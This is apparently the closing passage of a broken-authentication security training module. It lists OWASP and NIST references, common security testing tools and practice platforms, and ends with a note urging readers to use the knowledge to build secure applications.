- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [NIST Digital Identity Guidelines](https://pages.nist.gov/800-63-3/)

### 🛠️ **Professional Tools**
- **Burp Suite**: Web application security testing
- **OWASP ZAP**: Free security testing proxy
- **Nmap**: Network discovery and security auditing
- **Metasploit**: Penetration testing framework

### 🏫 **Training Platforms**
- **PortSwigger Web Security Academy**: Free web security training
- **OWASP WebGoat**: Deliberately insecure application
- **HackTheBox**: Hands-on penetration testing platform
- **TryHackMe**: Beginner-friendly cybersecurity challenges

---

> **🎓 Congratulations!** You've completed the Broken Authentication Security Module. Use this knowledge responsibly to build more secure applications and make the digital world safer for everyone.

**🔒 Remember**: Great security professionals aren't just good at finding vulnerabilities—they're excellent at preventing them. Focus on building secure solutions, not just breaking things.